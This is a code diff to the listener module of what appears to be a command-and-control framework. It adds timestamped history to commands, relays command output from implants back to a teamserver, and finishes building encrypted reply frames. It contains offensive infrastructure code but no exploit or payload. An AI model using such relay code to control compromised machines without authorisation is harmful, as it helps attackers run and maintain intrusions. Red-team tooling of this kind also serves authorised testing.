@@ -1,3 +1,5 @@
+from time import time
+
 from lib import instructions
 from lib import transmit
 from lib import implants
@@ -95,6 +97,7 @@ def request_command(listener):
 
 def receive_command(frame, listener):
     cmd_txids = []
+    done_cmds = []
     # Loop through each command in the list of received commands
     for command in frame['args'][0]:
         # First we get the index of the implant
@@ -107,11 +110,21 @@ def receive_command(frame, listener):
         # Finally, we'll set the implant_id in the transport, we'll do this every time
         listener.transports[transport_index].implant_id = command['component_id']
         # Set the command state to "RELAYING"
+        event_history = {"timestamp": time(), "event": "RECEIVED", "component": listener.component_id}
+        command['history'].append(event_history)
         command['state'] = "RELAYING"
         listener.cmd_queue.append(command)
         cmd_txids.append(command['txid'])
+    # This is in case we have commands we need to relay the output back to the TS for:
+    for command in listener.cmd_queue:
+        if command['state'] == "OUTPUT_RECEIVED":
+            # Set the command state to "OUTPUT_RELAYED"
+            event_history = {"timestamp": time(), "event": "OUTPUT_RELAYED", "component": listener.component_id}
+            command['history'].append(event_history)
+            command['state'] = "OUTPUT_RELAYED"
+            done_cmds.append(command)
     data = {'component_id': listener.component_id, "txid": frame['txid'], "cmd": "rcok",
-            "args": [{"cmd_txids": cmd_txids}, {"lpk": listener.current_public_key._public_key}]}
+            "args": [{"cmd_txids": cmd_txids}, {"lpk": listener.current_public_key._public_key}], "done": done_cmds}
     listener.current_ts_pubkey = asymmetric.public_key_from_bytes(str(frame['args'][1]['tpk']))
     instruction_frame = instructions.create_instruction_frame(data)
     reply_frame = transmit.cook_transmit_frame(listener, instruction_frame, "teamserver")
@@ -149,14 +162,16 @@ def retrieve_command_for_implant(frame, listener):
         if command['state'] == "RELAYING":
             try:
                 if implant_index == implants._get_implant_index(listener, command['component_id']) and \
-                        transport_index == command['transport_index']:
+                        listener.transports[transport_index].transport_id == command['transport_id']:
+                    event_history = {"timestamp": time(), "event": "SENT", "component": listener.component_id}
+                    command['history'].append(event_history)
                     command['state'] = "RELAYED"
-                    listener.logging.log(f"Relaying cmd: {command} to implant {implant_id}",level="debug",
+                    listener.logging.log(f"Relaying cmd: {command} to implant {implant_id}", level="debug",
                                          source=f"lib.core")
                     return_commands.append(command)
             except Exception as e:
                 listener.logging.log(
-                    f"Critical [{type(e).__name__}] when relaying command to implant {command['component_id']}: {e}",
+                    f"Critical [{type(e).__name__}] when retreiving command for implant {command['component_id']}: {e}",
                     level="critical", source=f"lib.core")
     # Cook it with the implant's keys and make it a data frame
     # TODO: Rotate the key
@@ -164,6 +179,33 @@ def retrieve_command_for_implant(frame, listener):
             "args": [return_commands, {'lpk': listener.implants[implant_index]['lpk']}],
             "txid": frame['txid']}
     instruction_frame = instructions.create_instruction_frame(data)
-    # TODO: Cook the reply frame
+    reply_frame = transmit.cook_transmit_frame(listener, instruction_frame, implant_id)
+    return reply_frame
+
+
+def get_cmd_output(frame, listener):
+    cmd_txids = []
+    implant_id = frame['component_id']
+    implant_index = implants._get_implant_index(listener, implant_id)
+    for command in frame['args'][0]:
+        # Get the index of the implant
+        implant_index = implants._get_implant_index(listener, command['component_id'])
+        # Set the command state to "RELAYING"
+        event_history = {"timestamp": time(), "event": "OUTPUT_RECEIVED", "component": listener.component_id}
+        command['history'].append(event_history)
+        command['state'] = "OUTPUT_RECEIVED"
+        # Get the command index in the cmd_queue
+        cmd_index = next(
+            (index for (index, d) in enumerate(listener.cmd_queue) if d["txid"] == command['txid']),
+            None)
+        listener.logging.log(f"Received output for cmd: {command['txid']}", level="debug",
+                             source=f"lib.core")
+        listener.cmd_queue[cmd_index] = command
+        cmd_txids.append(command['txid'])
+    # TODO: Rotate the key
+    data = {'component_id': listener.component_id, "cmd": "rcmda",
+            "args": [cmd_txids, {'lpk': listener.implants[implant_index]['lpk']}],
+            "txid": frame['txid']}
+    instruction_frame = instructions.create_instruction_frame(data)
     reply_frame = transmit.cook_transmit_frame(listener, instruction_frame, implant_id)
     return reply_frame
